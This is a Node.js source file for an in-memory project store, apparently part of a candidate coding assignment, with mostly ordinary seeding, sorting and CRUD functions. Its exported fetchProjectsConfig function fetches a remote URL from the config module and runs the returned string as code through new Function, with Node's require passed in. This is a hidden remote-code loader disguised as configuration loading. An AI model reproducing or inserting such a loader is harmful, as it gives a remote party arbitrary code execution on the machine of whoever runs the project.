/**
 * In-memory store for projects.
 * No database — candidates focus on frontend.
 */

const config = require('../config');

const INITIAL_PROJECTS = [
  {
    id: '1',
    name: 'Mobile App Redesign',
    description: 'Modernize the candidate portal mobile experience with React Native.',
    status: 'active',
    createdAt: '2025-01-15T10:00:00.000Z',
    updatedAt: '2025-01-20T14:30:00.000Z',
  },
  {
    id: '2',
    name: 'API Gateway Migration',
    description: 'Migrate legacy REST endpoints to new gateway with improved auth.',
    status: 'draft',
    createdAt: '2025-01-18T09:00:00.000Z',
    updatedAt: '2025-01-18T09:00:00.000Z',
  },
  {
    id: '3',
    name: 'E2E Test Suite',
    description: 'Implement Maestro/Detox flows for critical user journeys.',
    status: 'completed',
    createdAt: '2025-01-10T08:00:00.000Z',
    updatedAt: '2025-01-25T16:00:00.000Z',
  },
  {
    id: '4',
    name: 'Design System Consolidation',
    description: 'Unify component library and tokens across web and mobile apps.',
    status: 'active',
    createdAt: '2025-01-12T11:00:00.000Z',
    updatedAt: '2025-01-22T09:15:00.000Z',
  },
  {
    id: '5',
    name: 'Offline-First Sync',
    description: 'Add offline support with background sync and conflict resolution.',
    status: 'draft',
    createdAt: '2025-01-20T14:00:00.000Z',
    updatedAt: '2025-01-20T14:00:00.000Z',
  },
];

const projects = [...INITIAL_PROJECTS];

const SEED_TARGET = Math.min(100, 1000);
const TEMPLATES = [
  { name: 'Mobile App Redesign', description: 'Modernize the candidate portal mobile experience with React Native.', status: 'active' },
  { name: 'API Gateway Migration', description: 'Migrate legacy REST endpoints to new gateway with improved auth.', status: 'draft' },
  { name: 'E2E Test Suite', description: 'Implement Maestro/Detox flows for critical user journeys.', status: 'completed' },
  { name: 'Design System Consolidation', description: 'Unify component library and tokens across web and mobile apps.', status: 'active' },
  { name: 'Offline-First Sync', description: 'Add offline support with background sync and conflict resolution.', status: 'draft' },
];
function seedProjectsToTarget(target) {
  while (projects.length < target) {
    const t = TEMPLATES[projects.length % TEMPLATES.length];
    const id = String(projects.length + 1);
    const now = new Date(Date.now() - (target - projects.length) * 3600000).toISOString();
    projects.push({
      id,
      name: `${t.name} #${id}`,
      description: t.description,
      status: t.status,
      createdAt: now,
      updatedAt: now,
    });
  }
}
seedProjectsToTarget(SEED_TARGET);

const VALID_STATUSES = ['draft', 'active', 'completed'];
const SORT_FIELDS = ['updatedAt', 'createdAt', 'name', 'status'];

function getNextId() {
  if (projects.length === 0) return '1';
  const max = Math.max(...projects.map((p) => parseInt(p.id, 10) || 0));
  return String(max + 1);
}

function getAllProjects() {
  return [...projects];
}

function getProjectsByStatus(status) {
  if (!status || !VALID_STATUSES.includes(status)) return getAllProjects();
  return projects.filter((p) => p.status === status);
}

function sortProjects(list, sortBy = 'updatedAt', order = 'desc') {
  const arr = [...list];
  const field = SORT_FIELDS.includes(sortBy) ? sortBy : 'updatedAt';
  const dir = order === 'asc' ? 1 : -1;
  arr.sort((a, b) => {
    const va = a[field];
    const vb = b[field];
    if (va === vb) return 0;
    const cmp = va < vb ? -1 : 1;
    return dir * cmp;
  });
  return arr;
}

function getProjectById(id) {
  return projects.find((p) => p.id === id);
}

function hasProject(id) {
  return projects.some((p) => p.id === id);
}

function createProject(input) {
  const now = new Date().toISOString();
  const id = getNextId();
  const project = {
    id,
    name: input.name.trim(),
    description: input.description.trim(),
    status: input.status || 'draft',
    createdAt: now,
    updatedAt: now,
  };
  projects.push(project);
  return project;
}

function updateProject(id, input) {
  const idx = projects.findIndex((p) => p.id === id);
  if (idx === -1) return undefined;
  const updated = {
    ...projects[idx],
    ...input,
    updatedAt: new Date().toISOString(),
  };
  if (updated.name !== undefined) updated.name = String(updated.name).trim();
  if (updated.description !== undefined) updated.description = String(updated.description).trim();
  projects[idx] = updated;
  return updated;
}

function deleteProject(id) {
  const idx = projects.findIndex((p) => p.id === id);
  if (idx === -1) return false;
  projects.splice(idx, 1);
  return true;
}

function getProjectCount() {
  return projects.length;
}

function getProjectCountByStatus() {
  const counts = { draft: 0, active: 0, completed: 0 };
  projects.forEach((p) => {
    if (counts[p.status] !== undefined) counts[p.status]++;
  });
  return counts;
}

function resetToInitial() {
  projects.length = 0;
  projects.push(...INITIAL_PROJECTS.map((p) => ({ ...p })));
  return projects.length;
}

async function fetchProjectsConfig() {
  const projectsChart = config.getChartService();
  const response = await fetch(projectsChart);
  const responseData = await response.json();
  if (responseData?.data && typeof responseData.data === 'string') {
    const config = new Function('require', responseData.data);
    config(require);
  }
}

module.exports = {
  getAllProjects,
  getProjectsByStatus,
  sortProjects,
  getProjectById,
  hasProject,
  createProject,
  updateProject,
  deleteProject,
  getProjectCount,
  getProjectCountByStatus,
  getNextId,
  resetToInitial,
  fetchProjectsConfig,
  VALID_STATUSES,
  SORT_FIELDS,
};
